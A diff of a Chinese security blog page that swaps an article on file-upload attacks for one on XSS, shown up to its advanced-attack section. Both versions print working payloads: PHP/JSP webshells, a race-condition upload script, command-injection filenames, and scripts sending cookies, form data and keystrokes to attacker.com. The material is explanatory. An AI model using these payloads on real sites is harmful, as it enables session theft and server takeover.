@@ -4,8 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="文件上传安全：原理、攻击与防御, 是小竹不是小猪">
-    <meta name="description" content="一、文件上传的核心原理1.1 HTTP  multipart/form-data 协议文件上传依赖 HTTP POST 请求的 multipart/form-data 编码类型。与 application/x-www-form-urlenc">
+    <meta name="keywords" content="XSS 跨站脚本攻击：原理、攻击与防御, 是小竹不是小猪">
+    <meta name="description" content="一、XSS 的核心原理1.1 本质：数据与代码的边界混淆XSS（Cross-Site Scripting，跨站脚本攻击）的根本原因是用户可控数据被浏览器当作可执行代码解释。
+这与 SQL 注入的逻辑完全同构——SQL 注入是用户输入被数据库">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +18,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>文件上传安全：原理、攻击与防御 | 是小竹不是小猪</title>
+    <title>XSS 跨站脚本攻击：原理、攻击与防御 | 是小竹不是小猪</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -309,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">文件上传安全：原理、攻击与防御</h1>
+                    <h1 class="description center-align post-title">XSS 跨站脚本攻击：原理、攻击与防御</h1>
                 </div>
             </div>
         </div>
@@ -434,12 +435,12 @@
                                 <span class="chip bg-color">安全</span>
                             </a>
                         
-                            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
-                                <span class="chip bg-color">文件上传</span>
-                            </a>
-                        
                             <a href="/tags/Web%E5%AE%89%E5%85%A8/">
                                 <span class="chip bg-color">Web安全</span>
+                            </a>
+                        
+                            <a href="/tags/XSS/">
+                                <span class="chip bg-color">XSS</span>
                             </a>
                         
                     </div>
@@ -475,313 +476,393 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="一、文件上传的核心原理"><a href="#一、文件上传的核心原理" class="headerlink" title="一、文件上传的核心原理"></a>一、文件上传的核心原理</h3><h4 id="1-1-HTTP-multipart-form-data-协议"><a href="#1-1-HTTP-multipart-form-data-协议" class="headerlink" title="1.1 HTTP  multipart/form-data 协议"></a>1.1 HTTP  multipart/form-data 协议</h4><p>文件上传依赖 HTTP POST 请求的 <code>multipart/form-data</code> 编码类型。与 <code>application/x-www-form-urlencoded</code> 不同，它将请求体按 boundary 分割为多个部分，每个部分可以携带独立的 Content-Type 和文件名。</p>
-<pre><code>POST /upload HTTP/1.1
-Host: example.com
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk
-
-------WebKitFormBoundary7MA4YWxk
-Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;
-Content-Type: application/x-php
-
-&lt;?php phpinfo(); ?&gt;
-------WebKitFormBoundary7MA4YWxk--
-</code></pre>
-<p>关键点在于：<code>filename</code> 字段和 <code>Content-Type</code> 字段完全由客户端控制，服务端不能信任这两个值中的任何一个。这是文件上传安全问题的根源。</p>
-<h4 id="1-2-服务端处理流程"><a href="#1-2-服务端处理流程" class="headerlink" title="1.2 服务端处理流程"></a>1.2 服务端处理流程</h4><p>典型的服务端文件上传处理分为以下几个阶段：接收原始字节流 → 解析 multipart 结构 → 提取文件名和类型 → 执行校验逻辑 → 写入文件系统或对象存储 → 返回结果。</p>
-<p>攻击面分布在这条链路的几乎每个环节。文件名解析阶段的绕过针对的是”校验逻辑”，内容类型伪造针对的也是”校验逻辑”，而路径穿越则同时涉及文件名解析和写入阶段。</p>
-<h4 id="1-3-为什么文件上传危险"><a href="#1-3-为什么文件上传危险" class="headerlink" title="1.3 为什么文件上传危险"></a>1.3 为什么文件上传危险</h4><p>文件上传的本质风险是：攻击者将恶意内容写入服务端可执行环境。一旦满足两个条件就构成完整漏洞——恶意内容被存储到了服务端，且该内容能被服务端以某种方式执行或触发。</p>
+                <h3 id="一、XSS-的核心原理"><a href="#一、XSS-的核心原理" class="headerlink" title="一、XSS 的核心原理"></a>一、XSS 的核心原理</h3><h4 id="1-1-本质：数据与代码的边界混淆"><a href="#1-1-本质：数据与代码的边界混淆" class="headerlink" title="1.1 本质：数据与代码的边界混淆"></a>1.1 本质：数据与代码的边界混淆</h4><p>XSS（Cross-Site Scripting，跨站脚本攻击）的根本原因是<strong>用户可控数据被浏览器当作可执行代码解释</strong>。</p>
+<p>这与 SQL 注入的逻辑完全同构——SQL 注入是用户输入被数据库引擎当作 SQL 指令执行，XSS 是用户输入被浏览器当作 JavaScript 执行。区别只在于执行环境不同：一个是数据库引擎，一个是浏览器渲染引擎。</p>
+<p>浏览器解析 HTML 时，遇到 <code>&lt;script&gt;</code> 标签、事件处理属性（<code>onerror</code>、<code>onload</code>）、<code>javascript:</code> 伪协议等，会将其中的内容作为代码执行。如果这些位置的内容来自用户输入且未经转义，攻击者就能注入任意 JavaScript 代码。</p>
+<h4 id="1-2-为什么-XSS-危险"><a href="#1-2-为什么-XSS-危险" class="headerlink" title="1.2 为什么 XSS 危险"></a>1.2 为什么 XSS 危险</h4><p>JavaScript 在浏览器中运行在同源策略（Same-Origin Policy）下，拥有对当前域名下 Cookie、localStorage、DOM 的完全访问权限。一段恶意脚本能做的事情包括：窃取 Cookie 和会话令牌、劫持用户操作（模拟点击、表单提交）、重定向到钓鱼页面、读取页面中的所有敏感数据（如银行卡号、个人信息）、利用用户身份调用后端 API。</p>
+<p>如果配合社工手段，XSS 的危害会被进一步放大——攻击者不需要直接攻击服务端，而是让受害者自己的浏览器成为攻击载体。</p>
 <hr>
-<h3 id="二、攻击手段全景"><a href="#二、攻击手段全景" class="headerlink" title="二、攻击手段全景"></a>二、攻击手段全景</h3><h4 id="2-1-文件类型绕过"><a href="#2-1-文件类型绕过" class="headerlink" title="2.1 文件类型绕过"></a>2.1 文件类型绕过</h4><p><strong>2.1.1 前端校验绕过</strong></p>
-<p>最基础的场景。很多系统仅靠 JavaScript 的 <code>accept</code> 属性或文件扩展名白名单做前端拦截。攻击者只需修改请求中的 <code>filename</code> 扩展名即可绕过，或者直接用 Burp Suite / curl 构造请求，完全跳过前端。</p>
-<pre><code class="bash"># 将 .php 改为 .jpg，但内容仍是 PHP
-curl -X POST http://target/upload \
-  -F &quot;file=@shell.php;type=image/jpeg;filename=shell.jpg&quot;
+<h3 id="二、XSS-的三种类型"><a href="#二、XSS-的三种类型" class="headerlink" title="二、XSS 的三种类型"></a>二、XSS 的三种类型</h3><h4 id="2-1-反射型-XSS（Reflected）"><a href="#2-1-反射型-XSS（Reflected）" class="headerlink" title="2.1 反射型 XSS（Reflected）"></a>2.1 反射型 XSS（Reflected）</h4><p>恶意脚本出现在 HTTP 请求中（URL 参数、表单字段），服务端将其原样返回到响应页面里，浏览器解析时执行。</p>
+<p>典型场景：搜索框回显用户输入。</p>
+<pre><code>https://example.com/search?q=&lt;script&gt;document.location=&#39;https://attacker.com/steal?c=&#39;+document.cookie&lt;/script&gt;
 </code></pre>
-<p><strong>2.1.2 MIME 类型伪造</strong></p>
-<p>HTTP 请求中每个 multipart 部分都有一个 <code>Content-Type</code> 字段，这个值完全由客户端填写，服务端读到的就是客户端发的原文。问题在于很多开发者用这个值来判断文件类型：</p>
-<pre><code class="php">// 危险写法：直接信任客户端发来的 Content-Type
-if ($_FILES[&#39;file&#39;][&#39;type&#39;] === &#39;image/jpeg&#39;) &#123;
-    move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &#39;/uploads/&#39; . $_FILES[&#39;file&#39;][&#39;name&#39;]);
-&#125;
+<p>服务端如果直接将 <code>q</code> 参数的值拼入 HTML：</p>
+<pre><code class="php">// 危险写法
+echo &quot;&lt;div class=&#39;result&#39;&gt;搜索结果：&quot; . $_GET[&#39;q&#39;] . &quot;&lt;/div&gt;&quot;;
 </code></pre>
-<p>攻击者用 Burp Suite 或 curl 构造请求时，把 <code>Content-Type</code> 随便写：</p>
-<pre><code class="bash">curl -F &quot;file=@webshell.php;type=image/jpeg&quot; http://target/upload
+<p>浏览器渲染时，<code>&lt;script&gt;</code> 标签被执行，Cookie 被发送到攻击者服务器。</p>
+<p>反射型 XSS 的特点是<strong>非持久化</strong>——恶意脚本不存储在服务端，每次都需要诱导用户点击包含恶意参数的链接。攻击面在于 URL 参数被回显到页面的所有位置。</p>
+<h4 id="2-2-存储型-XSS（Stored-Persistent）"><a href="#2-2-存储型-XSS（Stored-Persistent）" class="headerlink" title="2.2 存储型 XSS（Stored / Persistent）"></a>2.2 存储型 XSS（Stored / Persistent）</h4><p>恶意脚本被存储在服务端（数据库、文件系统），当其他用户访问包含该数据的页面时自动执行。</p>
+<p>典型场景：评论区、个人简介、帖子内容、文件名展示。</p>
+<pre><code class="html">&lt;!-- 攻击者在评论区提交 --&gt;
+&lt;img src=x onerror=&quot;fetch(&#39;https://attacker.com/steal?c=&#39;+document.cookie)&quot;&gt;
 </code></pre>
-<p>服务端收到的 <code>$_FILES[&#39;file&#39;][&#39;type&#39;]</code> 就是 <code>image/jpeg</code>，校验通过，但实际写入磁盘的是一个 PHP 文件。本质原因是 <strong>HTTP 协议层面没有任何机制强制客户端如实声明文件类型</strong>，这只是一个建议性的请求头字段，和浏览器自动检测的真实类型无关。PHP 中 <code>$_FILES[&#39;file&#39;][&#39;type&#39;]</code> 读的就是这个值，完全不可信。</p>
-<p><strong>2.1.3 扩展名黑名单绕过</strong></p>
-<p>黑名单策略试图拦截 <code>.php</code>、<code>.jsp</code>、<code>.exe</code> 等危险扩展名，但几乎不可能穷举所有变体：</p>
-<ul>
-<li>大小写变体：<code>.PhP</code>、<code>.pHp</code></li>
-<li>双写绕过：<code>.pphphp</code>（如果过滤逻辑只删除一次 <code>.php</code>）</li>
-<li>等价扩展名：<code>.php3</code>、<code>.php5</code>、<code>.phtml</code>、<code>.phps</code>（Apache 可配置为解析 PHP）</li>
-<li>不可见字符：<code>shell.php </code>（末尾空格）、<code>shell.php.</code>（末尾点号），Windows 会自动去除</li>
-<li><code>.htaccess</code> 上传：上传 <code>.htaccess</code> 文件让服务器将 <code>.jpg</code> 当 PHP 解析</li>
-</ul>
-<pre><code class="apache"># .htaccess 内容：让所有 .jpg 文件被当作 PHP 执行
-AddType application/x-httpd-php .jpg
+<p>这条评论被存入数据库。当其他用户浏览该页面时，服务端从数据库取出评论内容拼入 HTML，浏览器解析到 <code>&lt;img&gt;</code> 标签的 <code>onerror</code> 事件，脚本执行。</p>
+<p>存储型 XSS 的危害远大于反射型，因为攻击者只需注入一次，所有访问该页面的用户都会中招。</p>
+<h4 id="2-3-DOM-型-XSS（DOM-based）"><a href="#2-3-DOM-型-XSS（DOM-based）" class="headerlink" title="2.3 DOM 型 XSS（DOM-based）"></a>2.3 DOM 型 XSS（DOM-based）</h4><p>与前两种不同，DOM 型 XSS 的漏洞 entirely 发生在客户端。恶意数据从 DOM 中读取（如 <code>location.hash</code>、<code>document.referrer</code>、<code>window.name</code>），未经转义直接写入页面（如 <code>innerHTML</code>、<code>document.write</code>）。</p>
+<pre><code class="javascript">// 危险写法
+const hash = location.hash.slice(1);
+document.getElementById(&#39;content&#39;).innerHTML = decodeURIComponent(hash);
 </code></pre>
-<p>三种典型手法的原理展开：</p>
-<p><strong>大小写变体。</strong> 黑名单通常只列了小写的 <code>.php</code>，但 Windows 文件系统不区分大小写，<code>Shell.PhP</code> 和 <code>shell.php</code> 指向同一个文件。如果服务端用字符串匹配做黑名单检查但没做 <code>toLowerCase()</code>，<code>PhP</code> 就绕过了。Linux 上虽然文件系统区分大小写，但 Apache 的 <code>AddHandler</code> 配置也可以做成大小写不敏感匹配。</p>
-<p><strong>双扩展名 <code>shell.php.jpg</code>。</strong> 分两种情况。第一种，有些系统的校验逻辑是”看最后一个扩展名是不是在白名单里”，<code>shell.php.jpg</code> 的最后扩展名是 <code>.jpg</code>，通过了检查。但如果 Apache 配置了 <code>AddHandler php-script .php</code>，它会从文件名中找到 <code>.php</code> 并按 PHP 执行，忽略后面的 <code>.jpg</code>。第二种，如果校验逻辑是”文件名中是否包含 <code>.php</code>“，攻击者可能用 <code>shell.php.jpg.php</code> 来绕过——有些过滤只检查一次，替换掉第一个 <code>.php</code> 后还剩一个。</p>
-<p><strong>空字节截断 <code>shell.php%00.jpg</code>。</strong> 这个问题出在 C 语言层面。C 字符串以 <code>\0</code>（空字节）作为终止符。PHP 5.3.4 以下版本和早期 Java 的文件操作中，文件名在传递给底层 C 函数（如 <code>fopen</code>、<code>stat</code>）之前没有过滤空字节。攻击者发送 <code>filename=shell.php%00.jpg</code>，服务端的校验逻辑看到的是 <code>shell.php.jpg</code>（按字符串比较，<code>.jpg</code> 后缀安全），但传递给操作系统写入文件时，C 函数遇到 <code>%00</code> 就截断了，实际创建的文件名是 <code>shell.php</code>。这个漏洞在现代 PHP（5.3.4+）中已修复，但在一些老旧系统或用 JNI 调用本地库的 Java 应用中仍可能遇到。</p>
-<p><strong>2.1.4 Magic Number（文件头）伪造</strong></p>
-<p>服务端如果只检查文件前几个字节（magic number），攻击者可以在恶意文件头部插入合法的文件签名：</p>
-<pre><code>GIF89a
-&lt;?php phpinfo(); ?&gt;
-</code></pre>
-<p>这样文件的前 6 个字节就是 GIF 的 magic number <code>47 49 46 38 39 61</code>，能通过文件头检查。如果服务端没有进一步校验文件完整性（比如图片是否能正常解码），这种绕过就能成功。</p>
-<p><strong>2.1.5 条件竞争（Race Condition）</strong></p>
-<p>当服务端采用”先保存再删除”的策略时（先写入临时文件，检查不通过后删除），存在一个时间窗口。攻击者可以并发发送大量请求，在文件被删除之前访问它：</p>
-<pre><code class="python">import threading
-import requests
+<p>攻击者构造 URL：<code>https://example.com/page#&lt;img src=x onerror=alert(1)&gt;</code></p>
+<p>这段代码从 <code>location.hash</code> 取出用户输入，直接赋给 <code>innerHTML</code>，浏览器解析并执行。整个过程中恶意数据从未到达服务端，所以传统的服务端 WAF 无法检测。</p>
+<p>DOM 型 XSS 的 sink（危险操作）常见的有：<code>innerHTML</code>、<code>outerHTML</code>、<code>document.write</code>、<code>document.writeln</code>、<code>eval</code>、<code>setTimeout</code>（字符串参数）、<code>new Function</code>。source（数据来源）常见的有：<code>location.hash</code>、<code>location.search</code>、<code>document.referrer</code>、<code>window.name</code>、<code>postMessage</code>。</p>
+<hr>
+<h3 id="三、攻击手段全景"><a href="#三、攻击手段全景" class="headerlink" title="三、攻击手段全景"></a>三、攻击手段全景</h3><h4 id="3-1-注入点与-Payload-形态"><a href="#3-1-注入点与-Payload-形态" class="headerlink" title="3.1 注入点与 Payload 形态"></a>3.1 注入点与 Payload 形态</h4><p><strong>3.1.1 HTML 标签内注入</strong></p>
+<p>当用户输入被插入到 HTML 标签之间（如 <code>&lt;p&gt;用户输入&lt;/p&gt;</code>），攻击者需要闭合当前标签或引入新标签：</p>
+<pre><code class="html">&lt;!-- 原始页面 --&gt;
+&lt;p&gt;搜索结果：用户输入&lt;/p&gt;
 
-target = &quot;http://target/uploads/&quot;
+&lt;!-- 攻击者输入 --&gt;
+&lt;/p&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p&gt;
 
-def access_file():
-    while True:
-        r = requests.get(target + &quot;shell.php&quot;)
-        if r.status_code == 200 and &quot;phpinfo&quot; in r.text:
-            print(&quot;Got shell!&quot;)
-            break
+&lt;!-- 渲染结果 --&gt;
+&lt;p&gt;搜索结果：&lt;/p&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p&gt;&lt;/p&gt;
+</code></pre>
+<p><strong>3.1.2 HTML 属性内注入</strong></p>
+<p>当用户输入被放入属性值（如 <code>&lt;img src=&quot;用户输入&quot;&gt;</code>），攻击者需要闭合属性值和标签：</p>
+<pre><code class="html">&lt;!-- 原始页面 --&gt;
+&lt;img src=&quot;用户输入&quot; alt=&quot;avatar&quot;&gt;
 
-# 上传线程
-def upload_file():
-    while True:
-        requests.post(&quot;http://target/upload&quot;,
-            files=&#123;&quot;file&quot;: (&quot;shell.php&quot;, b&quot;&lt;?php phpinfo(); ?&gt;&quot;)&#125;)
+&lt;!-- 攻击者输入 --&gt;
+&quot; onerror=&quot;alert(1)&quot; x=&quot;
 
-threads = [threading.Thread(target=access_file) for _ in range(10)]
-threads += [threading.Thread(target=upload_file) for _ in range(5)]
-for t in threads: t.start()
+&lt;!-- 渲染结果 --&gt;
+&lt;img src=&quot;&quot; onerror=&quot;alert(1)&quot; x=&quot;&quot; alt=&quot;avatar&quot;&gt;
 </code></pre>
-<h4 id="2-2-路径穿越（Path-Traversal）"><a href="#2-2-路径穿越（Path-Traversal）" class="headerlink" title="2.2 路径穿越（Path Traversal）"></a>2.2 路径穿越（Path Traversal）</h4><p>攻击者在文件名中注入 <code>../</code> 序列，试图将文件写入 Web 根目录之外的任意位置：</p>
-<pre><code>filename=../../etc/cron.d/backdoor
-filename=..\..\Windows\System32\cmd.exe
+<p><strong>3.1.3 JavaScript 代码块内注入</strong></p>
+<p>当用户输入被嵌入到 <code>&lt;script&gt;</code> 标签内的 JS 代码中：</p>
+<pre><code class="html">&lt;script&gt;
+  var userName = &quot;用户输入&quot;;
+&lt;/script&gt;
 </code></pre>
-<p>不同语言的路径穿越风险点不同。Java 的 <code>File.getName()</code> 不会自动过滤 <code>../</code>，Python 的 <code>os.path.join</code> 遇到绝对路径会直接切换根目录。Node.js 的 <code>path.resolve</code> 也有类似问题。</p>
-<h4 id="2-3-文件名注入"><a href="#2-3-文件名注入" class="headerlink" title="2.3 文件名注入"></a>2.3 文件名注入</h4><p>文件名是用户可控的字符串。如果后端拿到文件名后不做转义就直接拼进其他操作，就会引发与上传无关的第二层漏洞。</p>
-<p><strong>SQL 注入场景：</strong></p>
-<pre><code class="php">$filename = $_FILES[&#39;file&#39;][&#39;name&#39;];  // 攻击者可控
-// 假设攻击者构造 filename = &quot;x.jpg&#39;); DROP TABLE uploads;--&quot;
-$sql = &quot;INSERT INTO files (filename, path) VALUES (&#39;$filename&#39;, &#39;$path&#39;)&quot;;
-// 展开后：
-// INSERT INTO files (filename, path) VALUES (&#39;x.jpg&#39;); DROP TABLE uploads;--&#39;, &#39;/uploads/xxx&#39;)
+<p>攻击者输入 <code>&quot;; alert(document.cookie); //</code>：</p>
+<pre><code class="html">&lt;script&gt;
+  var userName = &quot;&quot;; alert(document.cookie); //&quot;;
+&lt;/script&gt;
 </code></pre>
-<p>数据库执行了攻击者注入的 <code>DROP TABLE</code>。</p>
-<p><strong>命令注入场景：</strong></p>
-<pre><code class="php">$filename = $_FILES[&#39;file&#39;][&#39;name&#39;];  // 攻击者构造: &quot;a.jpg; cat /etc/passwd&quot;
-system(&quot;file /uploads/&quot; . $filename);
-// 展开后：
-// file /uploads/a.jpg; cat /etc/passwd
-</code></pre>
-<p>shell 会把 <code>;</code> 后面的内容当作第二条命令执行。</p>
-<p><strong>日志注入场景：</strong> 如果文件名被原样写入 access log，攻击者可以注入换行符伪造日志条目，或者注入 <code>%s</code> 等格式化字符串触发格式化字符串漏洞。</p>
-<p>核心问题是：<strong>文件名被当作不可信输入，但下游代码把它当成了安全数据。</strong></p>
-<h4 id="2-4-解析漏洞利用"><a href="#2-4-解析漏洞利用" class="headerlink" title="2.4 解析漏洞利用"></a>2.4 解析漏洞利用</h4><p><strong>2.4.1 Apache 多扩展名解析</strong></p>
-<p>Apache 默认从右向左识别扩展名，如果右侧扩展名无法识别，则向左回溯。配置 <code>AddHandler</code> 后，<code>shell.php.xxx</code> 可能被当作 PHP 执行。</p>
-<p><strong>2.4.2 IIS 解析漏洞</strong></p>
-<p>IIS 6.0 中，目录名包含 <code>.asp</code> 则该目录下所有文件都被当作 ASP 执行（如 <code>/xx.asp/</code> 目录下的 <code>.jpg</code> 文件）。IIS 7.0/7.5 在 <code>cgi.fix_pathinfo=1</code> 时存在解析漏洞：访问 <code>/upload/1.jpg/.php</code>，如果 <code>1.jpg</code> 存在，则按 PHP 解析。</p>
-<p><strong>2.4.3 Nginx 解析漏洞</strong></p>
-<p>Nginx 的 <code>cgi.fix_pathinfo</code> 配置不当也会导致类似问题。此外，如果配置了 <code>location ~ \.php$</code> 和 <code>location /upload/</code>，上传 <code>shell.jpg</code> 后访问 <code>shell.jpg/.php</code> 可能被 PHP-FPM 解析。</p>
-<p><strong>2.4.4 PHP 的 <code>$_FILES</code> 特性</strong></p>
-<p>PHP 在处理 <code>multipart/form-data</code> 时，如果存在多个同名的 <code>file</code> 字段，后面的值会覆盖前面的值。攻击者可以利用这个特性绕过只检查第一个文件的逻辑：</p>
-<pre><code>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.jpg&quot;
-Content-Type: image/jpeg
-[jpeg data]
+<p>双引号闭合了字符串字面量，后面的代码被当作新的 JS 语句执行。</p>
+<p>如果输入被放入单引号字符串，攻击者用 <code>&#39;; alert(1); //&#39;</code> 即可。如果没有引号包裹（如 <code>var x = 用户输入;</code>），攻击者可以直接输入 <code>alert(1);//</code>。</p>
+<p><strong>3.1.4 特殊上下文注入</strong></p>
+<p>某些 HTML 属性天然具有代码执行能力：</p>
+<pre><code class="html">&lt;!-- href 属性 --&gt;
+&lt;a href=&quot;用户输入&quot;&gt;点击&lt;/a&gt;
+&lt;!-- 攻击者输入：javascript:alert(1) --&gt;
 
-Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;
-Content-Type: application/x-php
-[php code]
+&lt;!-- style 属性（IE 低版本） --&gt;
+&lt;div style=&quot;background:url(用户输入)&quot;&gt;
+&lt;!-- 攻击者输入：javascript:alert(1) --&gt;
+
+&lt;!-- src/iframe 属性 --&gt;
+&lt;iframe src=&quot;用户输入&quot;&gt;&lt;/iframe&gt;
+&lt;!-- 攻击者输入：javascript:alert(1) --&gt;
 </code></pre>
-<h4 id="2-5-内容相关攻击"><a href="#2-5-内容相关攻击" class="headerlink" title="2.5 内容相关攻击"></a>2.5 内容相关攻击</h4><p><strong>2.5.1 WebShell 上传</strong></p>
-<p>最终目标通常是上传一个 WebShell——一段能被服务端解释器执行的恶意代码。不同语言有不同形态：</p>
-<pre><code class="php">// PHP 一句话木马
-&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;
+<h4 id="3-2-绕过过滤的常见技巧"><a href="#3-2-绕过过滤的常见技巧" class="headerlink" title="3.2 绕过过滤的常见技巧"></a>3.2 绕过过滤的常见技巧</h4><p><strong>3.2.1 大小写混合</strong></p>
+<pre><code class="html">&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+&lt;ImG sRc=x OnErRoR=alert(1)&gt;
 </code></pre>
-<pre><code class="jsp">// JSP WebShell
-&lt;% Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)); %&gt;
+<p>如果过滤逻辑只匹配小写 <code>&lt;script&gt;</code>，大小写混合即可绕过。</p>
+<p><strong>3.2.2 编码绕过</strong></p>
+<p>HTML 实体编码、URL 编码、Unicode 编码、Base64 编码，不同上下文有不同的解码时机：</p>
+<pre><code class="html">&lt;!-- HTML 实体编码 --&gt;
+&lt;img src=x onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;
+
+&lt;!-- URL 编码（在 href 中） --&gt;
+&lt;a href=&quot;javascript&amp;#x3A;alert(1)&quot;&gt;click&lt;/a&gt;
+
+&lt;!-- Unicode 转义（在 JS 字符串中） --&gt;
+&lt;script&gt;var x = &quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;&lt;/script&gt;
 </code></pre>
-<pre><code class="python"># Python (Flask debug 模式下)
-&#123;&#123; config.__class__.__init__.__globals__['os'].popen('id').read() &#125;&#125;
+<p><strong>3.2.3 利用不常见的标签和事件</strong></p>
+<pre><code class="html">&lt;!-- SVG 标签 --&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;svg/onload=alert(1)&gt;
+
+&lt;!-- Body 标签 --&gt;
+&lt;body onload=alert(1)&gt;
+
+&lt;!-- Input 标签 --&gt;
+&lt;input onfocus=alert(1) autofocus&gt;
+
+&lt;!-- Details 标签 --&gt;
+&lt;details open ontoggle=alert(1)&gt;
+
+&lt;!-- Marquee 标签 --&gt;
+&lt;marquee onstart=alert(1)&gt;
+
+&lt;!-- Video/Audio 标签 --&gt;
+&lt;video src=x onerror=alert(1)&gt;
 </code></pre>
-<p><strong>2.5.2 图片马（Polyglot）</strong></p>
-<p>将恶意代码嵌入图片文件的冗余数据区域（如 EXIF Comment、GIF 尾部），使其既是合法图片又是可执行脚本。配合文件包含漏洞（LFI）触发执行：</p>
-<pre><code class="bash"># 将 PHP 代码写入图片的 EXIF 注释
-exiftool -Comment=&quot;&lt;?php phpinfo(); ?&gt;&quot; image.jpg
+<p><strong>3.2.4 双写绕过</strong></p>
+<p>如果过滤逻辑只删除一次关键字（如将 <code>&lt;script&gt;</code> 替换为空），攻击者输入 <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code>，删除内层后剩下 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>。</p>
+<p><strong>3.2.5 利用注释和换行</strong></p>
+<pre><code class="html">&lt;script&gt;
+// 如果过滤了 &lt;script&gt;，但没过滤 &lt;/script&gt; 后的内容
+&lt;/script&gt; 后面的内容在某些解析器中仍可能被执行
 </code></pre>
-<p><strong>2.5.3 二次注入 / 存储型 XSS</strong></p>
-<p>假设一个社交平台允许用户上传头像，且上传目录可以通过 <code>https://www.example.com/uploads/xxx.svg</code> 直接访问。攻击者上传一个 SVG 文件：</p>
-<pre><code class="xml">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;
-  &lt;script&gt;
-    fetch(&#39;https://www.example.com/api/user/info&#39;).then(r =&gt; r.json()).then(data =&gt; &#123;
-      new Image().src = &#39;https://attacker.com/steal?cookie=&#39; + document.cookie;
+<p><strong>3.2.6 利用浏览器解析差异</strong></p>
+<p>不同浏览器对 HTML 的容错解析行为不同。例如，某些浏览器会自动补全未闭合的标签，或者对嵌套关系有不同的理解。攻击者可以利用这些差异构造只在特定浏览器中触发的 payload。</p>
+<h4 id="3-3-高级攻击场景"><a href="#3-3-高级攻击场景" class="headerlink" title="3.3 高级攻击场景"></a>3.3 高级攻击场景</h4><p><strong>3.3.1 XSS 窃取 Cookie 和 Session</strong></p>
+<pre><code class="javascript">new Image().src = &#39;https://attacker.com/steal?cookie=&#39; + encodeURIComponent(document.cookie);
+</code></pre>
+<p>利用 <code>&lt;img&gt;</code> 标签发起 GET 请求，将 Cookie 作为 URL 参数发送到攻击者服务器。这种方式不会在页面上留下可见痕迹。</p>
+<p><strong>3.3.2 XSS 劫持用户操作（BeEF 框架思路）</strong></p>
+<pre><code class="javascript">// 拦截所有表单提交，注入隐藏字段
+document.querySelectorAll(&#39;form&#39;).forEach(form =&gt; &#123;
+  form.addEventListener(&#39;submit&#39;, function(e) &#123;
+    e.preventDefault();
+    // 将表单数据发送到攻击者服务器
+    fetch(&#39;https://attacker.com/hook&#39;, &#123;
+      method: &#39;POST&#39;,
+      body: new FormData(form)
     &#125;);
-  &lt;/script&gt;
-&lt;/svg&gt;
+    // 然后正常提交
+    form.submit();
+  &#125;);
+&#125;);
 </code></pre>
-<p>当其他用户浏览到这个 SVG 时，浏览器会渲染它并执行其中的 JavaScript。因为 SVG 和主站在同一个域名 <code>www.example.com</code> 下，这段脚本能读取主站的 Cookie、调用主站的 API、以受害者的身份执行操作。</p>
-<p>这里的关键不是上传本身有漏洞，而是 <strong>上传目录没有做域名隔离</strong>。如果上传文件放在 <code>files.example.com</code> 或 CDN/OSS 上，即使 SVG 里有恶意脚本，它也只能在 <code>files.example.com</code> 的上下文中执行，拿不到主站的 Cookie。</p>
-<p>如果上传目录没有做独立的 Origin 隔离或 CSP 限制，这段脚本会在目标域下执行。</p>
-<h4 id="2-6-拒绝服务（DoS）"><a href="#2-6-拒绝服务（DoS）" class="headerlink" title="2.6 拒绝服务（DoS）"></a>2.6 拒绝服务（DoS）</h4><p>上传超大文件、Zip 炸弹（解压后体积指数膨胀）、或大量并发上传耗尽磁盘/连接资源。一个经典的 Zip 炸弹是 42KB 的 ZIP 文件解压后达到 4.5PB。</p>
+<p><strong>3.3.3 XSS + CSRF 组合攻击</strong></p>
+<pre><code class="javascript">// 利用用户的登录态，以用户身份发起 POST 请求修改密码
+fetch(&#39;https://example.com/api/change-password&#39;, &#123;
+  method: &#39;POST&#39;,
+  headers: &#123; &#39;Content-Type&#39;: &#39;application/json&#39; &#125;,
+  credentials: &#39;include&#39;,  // 携带 Cookie
+  body: JSON.stringify(&#123; newPassword: &#39;attacker_password&#39; &#125;)
+&#125;);
+</code></pre>
+<p><code>credentials: &#39;include&#39;</code> 确保请求携带目标域的 Cookie，后端无法区分这是用户主动操作还是 XSS 发起的请求。</p>
+<p><strong>3.3.4 XSS 键盘记录</strong></p>
+<pre><code class="javascript">document.addEventListener(&#39;keypress&#39;, function(e) &#123;
+  new Image().src = &#39;https://attacker.com/key?k=&#39; + encodeURIComponent(e.key);
+&#125;);
+</code></pre>
+<p>监听全局键盘事件，将每次按键发送到攻击者服务器。可以窃取用户在页面上输入的所有内容，包括密码。</p>
+<p><strong>3.3.5 利用 XSS 进行钓鱼</strong></p>
